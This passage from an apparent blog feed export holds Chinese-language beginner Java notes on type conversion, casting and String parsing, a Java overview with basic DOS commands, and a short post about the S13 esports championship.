class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> b ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure></li></ol><h2 id="基本数据类型转换">2.9 基本数据类型转换</h2><h3 id="自动类型转换">2.9.1 自动类型转换</h3><blockquote><p>自动类型转换：Java在进行赋值或运算时，精度（容量）小的类型自动转换为精度（容量）大的类型。</p><p>数据类型按精度（容量）大小排序为（<strong>背！</strong>）</p><p>左边精度小，右边精度大</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">char</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">int</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">long</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">float</span> -&gt;</span> double<br><span class="hljs-function"><span class="hljs-title">byte</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">short</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">int</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">long</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">float</span> -&gt;</span> double<br></code></pre></td></tr></table></figure><p>例子：<code>int a = 'c'</code> 或者 <code>double b = 80</code></p></blockquote><h4 id="转换细节">2.9.1.1 转换细节</h4><ol type="1"><li><p>有多种类型数据混合运算时，系统会将所有数据转换成容量最大的那种，再进行运算。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">float</span> <span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> n1 +<span class="hljs-number">1.1</span>; <span class="hljs-comment">//错误</span><br><span class="hljs-type">double</span> <span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> n1 +<span class="hljs-number">1.1</span>; <span class="hljs-comment">//正确</span><br><span class="hljs-type">float</span> <span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> n1 +<span class="hljs-number">1.1F</span>; <span class="hljs-comment">//正确</span><br></code></pre></td></tr></table></figure></li><li><p>如若把大精度（容量）数据赋值给小精度（容量）类型，就会报错（小数由于精度原因，大赋小会丢失精度，必不可用。但整数大赋小时：1.赋予具体数值时，判断范围。2.变量赋值时，判断类型。），反之进行自动类型转换。</p></li><li><p><code>byte</code> ，<code>short</code>和 <code>char</code>三者不会相互自动转换，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;  <span class="hljs-comment">//正确，当把具体数赋给 byte 时，先判断该数是否在byte范围内，如果是就可以。</span><br><span class="hljs-type">byte</span> <span class="hljs-variable">b3</span> <span class="hljs-operator">=</span> <span class="hljs-number">10000</span>; <span class="hljs-comment">//错误 </span><br><br><span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-type">byte</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> n2; <span class="hljs-comment">//错误，如果是变量赋值，判断类型</span><br><br><span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> b1; <span class="hljs-comment">//错误，不会自动转换</span><br></code></pre></td></tr></table></figure></li><li><p><code>byte</code> <code>short</code> <code>char</code>三者不会相互自动转换，但可以计算。计算时首先转化为<code>int</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-type">byte</span> <span class="hljs-variable">b3</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br><span class="hljs-type">short</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> b2 + s1;  <span class="hljs-comment">//正确</span><br><span class="hljs-type">byte</span> <span class="hljs-variable">b4</span> <span class="hljs-operator">=</span> b2 + b3;  <span class="hljs-comment">//错误</span><br></code></pre></td></tr></table></figure></li><li><p><code>boolean</code> 类型不参与自动转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-variable">pass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> pass; <span class="hljs-comment">//错误</span><br></code></pre></td></tr></table></figure></li><li><p>自动提升原则：表达式结果的类型自动提升为操作数中最大的类型。❤</p></li></ol><h3 id="强制类型转换">2.9.2 强制类型转换</h3><blockquote><p>强制类型转换：自动类型转换的逆过程，将容量大的数据类型转换为容量小的数据类型。使用时加上强制转换符<code>( )</code>，但<strong>可能造成精度降低或溢出</strong>，要格外注意。</p></blockquote><h4 id="使用细节-2">2.9.2.1 使用细节</h4><ol type="1"><li><p>当进行数据从大到小转换时，就要用强制转换。</p></li><li><p>强制转换只能对最近的操作数有效，往往会使用 <code>( )</code>提升优先级。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)<span class="hljs-number">10</span> * <span class="hljs-number">3.5</span> + <span class="hljs-number">6</span> * <span class="hljs-number">1.5</span>; <span class="hljs-comment">//编译错误：double -&gt;int</span><br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(<span class="hljs-number">10</span> * <span class="hljs-number">3.5</span> + <span class="hljs-number">6</span> * <span class="hljs-number">1.5</span>);<span class="hljs-comment">// 编译正确：(int)44.0 -&gt; 44</span><br></code></pre></td></tr></table></figure></li><li><p><code>char</code> 可以保留 <code>int</code>的常量值，但不能保存其变量值。此时需要强制类型转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">char</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> a;  <span class="hljs-comment">//错误</span><br><span class="hljs-type">char</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;  <span class="hljs-comment">//ok</span><br><span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (<span class="hljs-type">char</span>)a ;<span class="hljs-comment">//ok</span><br></code></pre></td></tr></table></figure></li><li><p><code>byte</code> <code>short</code> <code>char</code>在进行运算时，当作 <code>int</code> 处理。</p></li></ol><h4 id="练习">2.9.2.2 练习</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">short</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-number">12</span>; <span class="hljs-comment">//ok,12在short的范围内</span><br>s = s - <span class="hljs-number">9</span>;   <span class="hljs-comment">//错误，int -&gt; short</span><br><br><span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>; <span class="hljs-comment">//ok</span><br>b = b + <span class="hljs-number">11</span>; <span class="hljs-comment">//错误，int -&gt; byte</span><br>b = (<span class="hljs-type">byte</span>)(b + <span class="hljs-number">11</span>); <span class="hljs-comment">//ok</span><br><br><span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span>;  <span class="hljs-comment">//ok</span><br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">16</span>; <span class="hljs-comment">//ok</span><br><span class="hljs-type">float</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> <span class="hljs-number">.314F</span>; <span class="hljs-comment">//ok</span><br><span class="hljs-type">double</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> c + i + d; <span class="hljs-comment">//ok,float -&gt; double，自动转换</span><br><br><span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">16</span>; <span class="hljs-comment">//ok</span><br><span class="hljs-type">short</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-number">14</span>;<span class="hljs-comment">//ok</span><br><span class="hljs-type">short</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> s + b; <span class="hljs-comment">//错误，int -&gt; short </span><br></code></pre></td></tr></table></figure><h3 id="基本数据类型和-string-的转换">2.9.3 基本数据类型和<code>String</code> 的转换</h3><ul><li><p>基本类型转 <code>String</code>：基本数据类型加上<code>" "</code>即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><span class="hljs-type">float</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1.1F</span>;<br><span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;函&#x27;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> n1 + <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> f1 + <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> c1 + <span class="hljs-string">&quot;&quot;</span>;  <span class="hljs-comment">//char转String</span><br>System.out.println(s1 + <span class="hljs-string">&quot;&quot;</span> + s2 + <span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p><code>String</code> 转基本数据类型：通过基本数据类型的包装类调用<code>parseXX</code> 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123&quot;</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> Integer.parseInt(s);<br><span class="hljs-type">double</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> Double.parseDouble(s);<br><span class="hljs-type">float</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> Float.parseFloat(s);<br></code></pre></td></tr></table></figure><p>特别的，把 <code>String</code> 转换为 <code>char</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> s.charAt(<span class="hljs-number">0</span>);<span class="hljs-comment">// 得到 s 字符串中的第一个字符。</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="使用细节-3">2.9.3.1 使用细节</h4><ol type="1"><li>将 <code>String</code>转成基本数据类型时，要保证其能转换为有效数据。比如：不能把<code>"Hello"</code> 转换成 <code>int</code>。</li><li>如果格式不正确，会抛出，程序会中止。（问题会在异常处理章节中处理）👓</li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>S13能夺冠吗？</title>
    <link href="/2023/10/31/S13/"/>
    <url>/2023/10/31/S13/</url>
    
    <content type="html"><![CDATA[<p>S13，LPL能夺冠吗？</p><blockquote><p>2024.04.30，又看到这篇“文章”，哈哈哈</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>&lt;Java&gt; 1_概述</title>
    <link href="/2023/10/18/Java%201_%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/10/18/Java%201_%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="java-历史">1.1 Java 历史</h2><ul><li><p>目前 Java 版权属于甲骨文公司。</p></li><li><p>长期支持的版本只有 Java8 与Java11。这两个版本也是最多使用的版本。</p></li><li><p>Java SE：标准版</p><p>Java EE：企业版（重要）</p><p>Java ME：小型版（少）</p></li></ul><h2 id="java-重要特点">1.2 Java 重要特点</h2><ol type="1"><li><p>Java 语言是<strong>面向对象的（oop）</strong></p><p>简单来说，面向对象是一种程序设计技术。其重点放在数据（对象）和对象的接口上。</p></li><li><p>Java语言是<strong>健壮的</strong>。其强类型机制、异常处理、垃圾自动收集是健壮性的保证。</p><p>Java强调早期问题检测、后期动态检测，及消除易出错的情况。其编译器能检测很多其他语言仅在运行时才会发现的问题。</p></li><li><p>Java 语言是<strong>跨平台性</strong>的：一个编译好的<code>.class</code>文件可以在多个不同系统（windows、Linux等）下直接运行。</p></li><li><p>Java 语言是<strong>解释型</strong>的：Java解释器能在任何移植了解释器的机器上直接执行 Java 字节码。</p><p>解释性语言：javascript，PHP，java等</p><p>编译性语言：c， c++等</p><p>区别是：</p><ul><li>解释性语言，编译后的代码，不能直接被机器执行，需要解释器来执行</li><li>编译性语言，编译后的代码，可以直接被机器执行</li></ul></li></ol><h2 id="java的开发工具">1.3 Java的开发工具</h2><ul><li>javac：Java 编译器。将 Java 程序编译成字节码</li><li>java：Java 解释器。执行已经转换为字节码的文件</li><li>jdb：Java 调试器。调试 Java 程序</li><li>javap：反编译。将类文件还原回方法和变量</li><li>javadoc：文档生成器。创建 HTML 文件</li></ul><h2 id="java-运行基础">1.4 Java 运行基础</h2><p>JVM：Java Virtual Machine（Java虚拟机）</p><ul><li>JVM 是–跨平台性的基础。被包含在 JDK 中。</li><li>不同平台有各自对应的不同 JVM</li><li>JVM 屏蔽了底层平台的区别。能做到 ”一次编译，到处运行”</li></ul><p>JDK ：全称：Java Development Kit（Java 开发工具包）</p><ul><li>JDK = JRE + Java 的开发工具（Java，Javac，Javadoc 等等）</li><li>给开发人员使用的，包括了 JRE</li></ul><p>JRE：Java Runtime Enviroment（Java 运行环境）</p><ul><li>JRE = JVM + Java SE 标准类库（Java 的核心类库）</li><li>如果想要运行一个开发好的 Java 程序，计算机中只需要安装JRE即可</li></ul><h2 id="java快速入门">1.5 Java快速入门</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//java第一个程序</span><br><br><span class="hljs-comment">//1. public class Hello 表示Hello是一个类，是一个public公有的类</span><br><span class="hljs-comment">//2. Hello&#123;&#125;表示一个类的开始和结束</span><br><span class="hljs-comment">//3. public static void main(String[] args)表示一个主方法</span><br><span class="hljs-comment">//4. main()&#123;&#125;表示方法的开始和结束</span><br><span class="hljs-comment">//5. System.out.println(&quot;hello,world~&quot;)表示输出hello,world~</span><br><span class="hljs-comment">//6. ;表示语句结束</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span>&#123;<br><br><span class="hljs-comment">//main方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;我的 hello,world~&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="java-执行流程分析">1.6 Java 执行流程分析</h2><blockquote><p><code>.Java</code> 文件（源文件） — javac（编译）—<code>.class</code> 文件（字节码文件） — java（运行）— 结果</p></blockquote><h3 id="编译">1.5.1 编译</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>源文件名.<span class="hljs-keyword">java</span><br></code></pre></td></tr></table></figure><ul><li>通过编译器将 Java 源文件编译成 JVM可识别的字节码文件。字节码文件是二进制格式的，其格式是统一的。</li><li>在源文件目录下使用 Javac 编译工具对 Java 文件进行编译。</li><li>如果没有错误将没有提示，当前目录会对应其中每一个类生成对应名称的<code>.class</code> 文件，该文件称为字节码文件，也是可执行的 Java程序。</li></ul><h3 id="运行">1.5.2 运行</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">java 程序名 <span class="hljs-selector-attr">[参数列表]</span><br></code></pre></td></tr></table></figure><ul><li>有了可执行的 Java 程序（例如Hello.class字节码文件）</li><li>通过运行工具<code>Java.exe</code> 对字节码文件进行执行，本质是将<code>.class</code> 文件装载到 JVM 机执行</li></ul><p><strong>注意，修改后的 .Java 源文件需要重新编译</strong></p><h2 id="java-开发细节">1.7 Java 开发细节</h2><p><strong>在控制台按 Tab 可以实现代码补齐。</strong></p><ol type="1"><li><p>源文件以 <code>.java</code>为扩展名，源文件的基本组成部分是类（class）</p></li><li><p>Java 应用程序的执行入口是 <code>main()</code>方法。其有固定的<strong>书写格式：</strong></p><p><code>public static void main(string[]args)&#123;…&#125;</code></p></li><li><p>Java 语言<strong>严格区分大小写</strong>。</p></li><li><p>Java 方法由一条条语句构成，<strong>每个语句都以 <code>;</code>结束</strong>。</p></li><li><p><strong>大括号 <code>&#123;</code> <code>&#125;</code>是成对出现的</strong>，缺一不可。习惯先写 <code>&#123;&#125;</code>再写代码</p></li><li><p>一个源文件中<strong>最多只有一个 public类</strong>，其余类不限。</p></li><li><p><strong>如果文件中包含 public类，则文件名必须按该类命名。</strong></p></li><li><p>也可以把 main 方法写在非 public 类中，然后运行指定非 public类，这样入口方法是非 public 类的主方法。</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello2</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Hello,world~&quot;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//一个源文件中最多只有一个 public 类，其余类不限。</span><br><span class="hljs-comment">//Dog 是一个类</span><br><span class="hljs-comment">// 编译后，每一个类，都会生成一个.class</span><br><span class="hljs-comment">//这里就会生成三个.class文件</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>&#123;<br>    <span class="hljs-comment">//也可以把 main 方法写在非 public 类中，然后运行指定非 public 类，这样入口方法是非 public 类的主方法。</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Hello,小狗&quot;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tiger</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Hello,小老虎&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311011227499.png"alt="image-20231101122753469" /><figcaption aria-hidden="true">image-20231101122753469</figcaption></figure><h2 id="java-转义字符">1.8 Java 转义字符</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//演示转义字符的使用</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChangeChar2</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-comment">//     \t：一个制表位，实现对齐的功能</span><br>System.out.println(<span class="hljs-string">&quot;北京\t上海\t广州&quot;</span>);<br><br><span class="hljs-comment">//     \n：换行符</span><br>System.out.println(<span class="hljs-string">&quot;北京\n上海\n广州&quot;</span>);<br><br><span class="hljs-comment">//     \\：一个\</span><br>System.out.println(<span class="hljs-string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>);<br><br><span class="hljs-comment">//       \&#x27;：  一个&#x27;</span><br><span class="hljs-comment">//       \&quot;：  一个&quot;</span><br><span class="hljs-comment">//       \r：  一个回车</span><br>System.out.println(<span class="hljs-string">&quot;一起学习java\r我们&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311011508043.png"alt="image-20231101150805984" /><figcaption aria-hidden="true">image-20231101150805984</figcaption></figure><h2 id="代码规范">1.9 代码规范</h2><ol type="1"><li><p>类、方法的注释要以 Javadoc 的方式来写</p></li><li><p>非 Javadoc的注释，往往是给维护者看的，着重告诉读者为什么这样写，如何修改，注意什么问题等。</p></li><li><p>不要用 <code>a</code><code>b</code>，这种名称命名变量，尽量写得清楚<code>int age = 10;</code></p><p>另外，<strong>Java 源代码使用的是 Unicode码，因此汉语也能作为标识符</strong>。但不推荐使用汉语做标识符。</p></li><li><p>使用 tab 键操作，使代码右移。<strong>使用 shift+tab键，使代码左移</strong>。</p></li><li><p>运算符两边各加入空格。注意排版规范。</p></li><li><p>源文件使用 UTF-8 编码。</p></li><li><p>代码行宽度不要超过 80 个字符。超过时通过换行保持简洁。</p></li><li><p>代码编写<strong>次行风格</strong>及<strong>行尾风格</strong></p><blockquote><p>次行风格：换行输入<code>&#123;</code> <code>&#125;</code>，使其总在行头，√</p><p>行尾风格：在一行的末尾输入 <code>&#123;</code>，换行输入<code>&#125;</code></p></blockquote></li><li><p>一段代码完成一个小功能，尽量不要混合。这样更加灵活。</p></li></ol><h2 id="dos了解">1.10 DOS（了解）</h2><blockquote><p>DOS：Disk Operating System（磁盘操作系统）</p></blockquote><h3 id="dos-的基本原理">DOS 的基本原理</h3><blockquote><p>在 cmd（控制台）输入指令 — DOS系统 接受指令 — 解析指令 — 执行指令</p></blockquote><ul><li><p>相对路径和绝对路径（举例从 JDK8访问到 JDK8）</p><blockquote><p>相对路径：从当前目录开始定位，形成的路径 <code>..\jre\bin</code></p><p>返回上一级：<code>..\</code></p><p>绝对路径：从顶级目录开始定位，形成的路径<code>d:\Program\JDK8\jre\bin</code></p></blockquote></li></ul><h3 id="常用的-dos-命令">常用的 DOS 命令</h3><blockquote><p>查看帮助：<code>help</code> 或 <code>help cd</code> 等</p><p>查看目录内容：<code>dir</code> 查看当前目录 或<code>dir d:\Program\JDK8\bin</code> 查看指定目录</p><p>切换到其他盘：<code>cd /D d:</code> 从 C盘 切换至 D盘 （changedirectory）</p><p>切换到当前盘的其他目录：<code>cd d:\Program\JDK8\jre\bin</code></p><p>返回上级目录：<code>cd ..</code></p><p>切换至根目录：<code>cd \</code></p><p>查看子集目录：<code>tree</code> 当前目录 或<code>tree d:/Program</code> 指定目录</p><p>清屏：<code>cls</code></p><p>退出：<code>exit</code></p><p>创建目录：<code>md 目录名</code> 如：<code>md tom100</code></p><p>删除目录：<code>rd 目录名</code></p><p>:traffic_light:</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java学习</title>
    <link href="/2023/10/18/Java%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/10/18/Java%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-string">&quot;&quot;</span>);  <span class="hljs-comment">//换一行</span><br>System.out.println(<span class="hljs-string">&quot;\n&quot;</span>); <span class="hljs-comment">//换两行</span><br></code></pre></td></tr></table></figure><p>因为<code>System.out.println()</code>中的<code>ln</code>就已经换行一次了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//从键盘输入字符的代码</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-comment">//导入</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;请输入一个字符：&quot;</span>);<br>        <span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> myScanner.next().charAt(<span class="hljs-number">0</span>);<br>        System.out.println(<span class="hljs-string">&quot;字符为： &quot;</span> + c1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//从键盘输入整数型数据</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-comment">//导入</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;请输入年龄: &quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> myScanner.nextInt();<br>        System.out.println(<span class="hljs-string">&quot;输入为：&quot;</span> + age);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 